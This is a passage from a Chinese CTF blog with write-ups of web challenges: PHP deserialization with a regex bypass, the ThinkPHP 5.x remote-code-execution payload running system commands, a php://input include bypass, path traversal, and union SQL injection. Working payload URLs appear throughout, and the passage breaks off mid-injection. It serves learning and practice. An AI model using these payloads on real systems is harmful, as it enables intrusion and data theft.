</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/yanbai3/article/details/122300480">php代码审计原文链接</a></p>
<p>首先定义了Demo类，在类中定义了几个方法<code>construct()wakeup()destruct()</code>。在这里我们要知道，</p>
<p>php中<u><strong>类实例化的时候，首先运行wakeup()函数</strong></u>，</p>
<p>在<u><strong>序列化时先运行sleep()函数</strong></u>,</p>
<p>在<u><strong>反序列化时先运行wakeup()</strong></u>，</p>
<p>在<u><strong>脚本结束调用destruct()函数</strong></u>。 </p>
<p>继续审计代码，下面的<code>if</code>语句中，先用了<code>base64</code>的解码函数，进行了一次解码，又用一个正则表达式进行过滤，只有<code>base64</code>编码并通过正则表示式才能进行反序列化</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20231004231043515.png"><img src="/wp-Gongfang/image-20231004231043515.png" alt="image-20231004231043515"></a></p>
<p>这里的正则表达式<code>’/[oc]:\d+:/i’</code> 表示了<code>以O或者C开头</code>接：接数字，数字至少出现一次或者无数次，忽略大小写，所以我们将<code>O:4改为O:+4</code>则可通过正则表达式，因为在PHP代码里，<code>+4</code>就是<code>4</code>，所以绕过了正则匹配同时也不影响代码正常含义</p>
<p>这里看到了<code>fl4g.php</code>，先把它实例化，这里改一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里我就在想，如果这个实例化的时候()不加参数，那么最后序列化的结构只能是index.php，也就是源码中的，但是我们的目标是fl4g.php这个文件</span></span><br><span class="line"><span class="comment">//这里其实只需要在实例化类中，传入我们需要序列化的参数即可</span></span><br><span class="line"><span class="comment">//这里相当于给$flie赋值，如果类中多个值需要变成我们需要的参数，用&quot;,&quot;隔开即可，按赋值顺序，例如$a = new Demo(&quot;a&quot;,2,&quot;b&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://tool.lu/coderunner/">运行PHP代码</a></p>
<p>得到<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>这里看到有一个<code>__wakeup</code>，所以还要改一下属性值<code>1为2</code></p>
<p>–&gt;</p>
<p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p><strong>注意：</strong>这里有一个大坑让我卡了好久</p>
<p>先看下面这个图理解一下上面的语句</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20231004231058765.png"><img src="/wp-Gongfang/image-20231004231058765.png" alt="image-20231004231058765"></a></p>
<p>属性值为10，但是”<code>Demofile</code>“只有8个字符，很明显缺了两个字符，但是却被省略了，猜测确了<strong>两个空字符</strong></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上<span class="number">0</span>的前缀。字符串长度也包括所加前缀的长度</span><br><span class="line"></span><br><span class="line">所以也可以推测出Demofile是<span class="keyword">private</span>声明</span><br></pre></td></tr></table></figure>

<p>这里我一直卡住的<u>原因就是把空字符当作了空格</u></p>
<p>所以开始我是直接在D和f前加上空格，但是底下的base64编码提交url没有反应</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220628214059503.png"><img src="/wp-Gongfang/image-20220628214059503.png" alt="image-20220628214059503"></a></p>
<p>然后把decoder换成hex，发现空格是20（44是字母D，66是字母f）</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220628233504338.png"><img src="/wp-Gongfang/image-20220628233504338.png" alt="image-20220628233504338"></a></p>
<p>然后看了下面这个表，明白00才是空字符，空格和空字符不是同一个东西</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220628213218629.png"><img src="/wp-Gongfang/image-20220628213218629.png" alt="image-20220628213218629"></a></p>
<p>但是空字符无法复制，在复制时，空字符后的字符串会被截断，只复制了空字符前面的字符串</p>
<p>所以这里可以在hex里直接改，把20改成00</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220628233851825.png"><img src="/wp-Gongfang/image-20220628233851825.png" alt="image-20220628233851825"></a></p>
<p>然后下方的base64编码就可以了</p>
<p>访问</p>
<p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<p>得到flag</p>
<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-题目描述-16"><a href="#1-题目描述-16" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始界面如下</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220630174402928.png"><img src="/wp-Gongfang/image-20220630174402928.png" alt="image-20220630174402928"></a></p>
<p>（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）</p>
<p>这里可以先了解一下什么是<a href="../../../../2022/05/28/Web-study">rce</a>和该漏洞的成因</p>
<p>如果这里版本的thinkphp存在rce的漏洞，就可以通过指令获取flag</p>
<p>百度可知</p>
<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</code> </p>
<p>然后在Github上搜thinkphp得到<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220630174951670.png"><img src="/wp-Gongfang/image-20220630174951670.png" alt="image-20220630174951670"></a></p>
<p>尝试<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
<p>了解到最后的id处为命令执行语句输入处，用 find语句查看有没有flag文件</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220630175318946.png"><img src="/wp-Gongfang/image-20220630175318946.png" alt="image-20220630175318946"></a></p>
<p>得到的结果很乱，用F12整洁一些</p>
<p>最后行，看到flag文件夹</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220630175432667.png"><img src="/wp-Gongfang/image-20220630175432667.png" alt="image-20220630175432667"></a></p>
<p>用cat显示出来</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
<p>得到flag</p>
<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-17"><a href="#1-题目描述-17" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题先了解<a href="../../../../2022/05/28/Web-study">php伪协议</a></p>
<p>看名字很清楚是到文件包含的题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先分析一下函数</p>
<p><code>strstr()：</code><br><code>定义和用法：</code><br><code>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</code><br><code>区分大小写，stristr()函数不区分大小写</code><br><code>语法：</code><br><code>strstr(string,search,before_search)</code><br><code>string:必需，被搜索的字符串</code><br><code>search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符</code><br><code>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分</code></p>
<p><code>str_replace():</code><br><code>定义和用法：</code><br><code>以其它字符替换字符串中的一些字符（区分大小写）</code><br><code>语法：</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,必需，要查找的值</code><br><code>replace，必需，要替换的值</code><br><code>string，必需，被搜索的字符串</code><br><code>count，可选，替换次数</code></p>
<p>也就是说，如果page&#x3D;的内容里有php:&#x2F;&#x2F;就会被替换为空，也就是过滤</p>
<p>但是看源码我们知道，它只过滤了小写，所以可以用大小写绕过，这里用的php:&#x2F;&#x2F;input</p>
<p>*这道题好像包括php:&#x2F;&#x2F;input，有5种方法，建议看看这篇文章<a href="https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1">Web_php_include总结五种解法大同小异</a></p>
<p><code>http://111.200.241.244:59492/?page=PHP://input</code></p>
<p>php:&#x2F;&#x2F;input读取POST数据， 我先用hackbar，发现没有反应</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626215410026.png"><img src="/wp-Gongfang/image-20220626215410026.png" alt="image-20220626215410026"></a></p>
<p>看了一篇大佬的wp，说是被过滤了，所以不行</p>
<p>但这里可以用burp试试，得到flag文件名</p>
<p>fl4gisisish3r3.php</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626222916776.png"><img src="/wp-Gongfang/image-20220626222916776.png" alt="image-20220626222916776"></a></p>
<p>显示fl4gisisish3r3.php内容</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626223253399.png"><img src="/wp-Gongfang/image-20220626223253399.png" alt="image-20220626223253399"></a></p>
<p>得到flag</p>
<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>随便注</p>
<h3 id="2）wp-3"><a href="#2）wp-3" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题之前在buuctf上做过，考察堆叠注入，wp可以在<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>看一下</p>
<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-题目描述-19"><a href="#1-题目描述-19" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-4"><a href="#2）wp-4" class="headerlink" title="2）wp"></a>2）wp</h3><p>开始就只有一张图片，先看一下它源码</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703104834305.png"><img src="/wp-Gongfang/image-20220703104834305.png" alt="image-20220703104834305"></a></p>
<p>看到有一个source.php文件</p>
<p>访问<code>http://111.200.241.244:59132/source.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">//__FILE__常量返回文件的完整路径和文件名，高亮显示</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果不存在（isset()）或者不为字符串（is_string()）</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$page</span>.?字符串中出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$_page</span>字符串中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">//如果传的参数不是空的，并且是字符串，调用checkFile函数返回为true</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="comment">//对传来的参数进行包含</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//否则就输出图片</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有flag的线索，但看到一个hint.php文件</p>
<p>访问<code>http://111.200.241.244:59132/hint.php</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703105453437.png"><img src="/wp-Gongfang/image-20220703105453437.png" alt="image-20220703105453437"></a></p>
<p>知道了flag在ffffllllaaaagggg文件里</p>
<p>然后开始分析source.php代码（可以看看源码注释）</p>
<p>分析：</p>
<p>我们可以看到，关键在于 checkfile 函数，要让它返回为ture才能够实现文件包含，我们能控制的变量是file，<u>page变量实际是file变量的形参，由checkfile函数传过去</u>，也就是file变量要满足所有的if条件，才能返回ture而不是只显示图片</p>
<p>先分析checkfile函数里的四个if条件满足要求，避免执行return false</p>
<p>第一个if</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果不存在（isset()）或者不为字符串（is_string()）</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>因为语句里存在return false，所以要传入的<u>变量page存在且为字符串</u>，使得if语句为假，就不会执行return false，这个本身就满足，所以可以不考虑</p>
<p>第二个if</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="comment">//如果在白名单里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要我们传入的参数是source.php或者hint.php，满足whitelist(白名单)，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<p>第三个if，结合其前面代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">               <span class="variable">$page</span>,//要截取的字符串</span><br><span class="line">               <span class="number">0</span>,//起始位置</span><br><span class="line">               <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">               //返回？在<span class="variable">$page</span>.?字符串中出现的位置</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="comment">//如果在白名单里</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<p>第四个if</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$_page</span>字符串中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>先把参数进行url解码，然后和第三个if一样，取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<hr>
<p>至于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure>

<p>只要file不为空，且为字符串即可，可以满足不考虑</p>
<p>所以只有下面两种</p>
<p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p>
<p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p>
<p>由PHP4-7的include函数的特性</p>
<p><a data-fancybox="gallery" data-src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<p>在payload上加上<code>/../../../../../../ffffllllaaaagggg</code>，这里可只加四层..&#x2F;即可，但也可以加多个返回上个目录，也可以依次试试</p>
<p>得到flag</p>
<p><strong>补充</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() 函数返回字符串的一部分，之前我们学过 <span class="title function_ invoke__">substr</span>() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 <span class="title function_ invoke__">mb_substr</span>()。</span><br><span class="line">实例</span><br><span class="line">从字符串中返回 <span class="string">&quot;菜鸟&quot;</span>：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;菜鸟教程&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 输出：菜鸟</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystack：要被检查的字符串。</span><br><span class="line">needle：要搜索的字符串。</span><br><span class="line">----------------</span><br><span class="line"> in_array函数功能检查数组中是否存在某个值</span><br></pre></td></tr></table></figure>

<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-题目描述-20"><a href="#1-题目描述-20" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-5"><a href="#2）wp-5" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等</p>
<p>开始先判断sql注入存在</p>
<p>输入**1’**，报错返回空白页面</p>
<p>然后判断字段数</p>
<p>当输入语句为</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>返回空白页面，于是判断字段数为3</p>
<p>然后联合注入</p>
<p>先判断数据爆出口</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703204402467.png"><img src="/wp-Gongfang/image-20220703204402467.png" alt="image-20220703204402467"></a></p>
<p>得出数据在2，3位置处输出</p>
<p>然后按照标准sql注入流程即可</p>
<p>先看数据库和版本号</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703204520282.png"><img src="/wp-Gongfang/image-20220703204520282.png" alt="image-20220703204520282"></a></p>
<p>得到数据库名为<strong>news</strong>，MySQL版本为<strong>5.5.61</strong></p>
<p>然后查看news库的表名</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&quot;news&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703205326915.png"><img src="/wp-Gongfang/image-20220703205326915.png" alt="image-20220703205326915"></a></p>
<p>得到两个表名<strong>news</strong>和<strong>secret_table</strong></p>
<p>flag肯定在<strong>secret_table</strong>里</p>
<p>查看<strong>secret_table</strong>列</p>
